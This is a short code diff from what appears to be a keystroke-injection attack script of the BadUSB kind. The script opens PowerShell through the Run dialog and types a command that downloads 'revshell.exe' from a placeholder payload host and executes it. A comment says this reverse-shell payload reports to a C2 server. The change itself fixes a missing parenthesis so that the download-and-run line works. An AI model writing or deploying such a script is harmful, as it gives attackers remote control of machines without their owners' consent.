@@ -109,7 +109,7 @@ press("GUI r");
 delay(500);
 type("powershell\n");
 delay(2000);                                    // 'revshell' payload needs to point to C2 server
-type"wget http://{PAYLOAD_HOST_IP}:8000/revshell.exe -o RS.exe ; .\\RS.exe\n");
+type("wget http://{PAYLOAD_HOST_IP}:8000/revshell.exe -o RS.exe ; .\\RS.exe\n");
 delay(500);
 type("exit\n");
 delay(500);
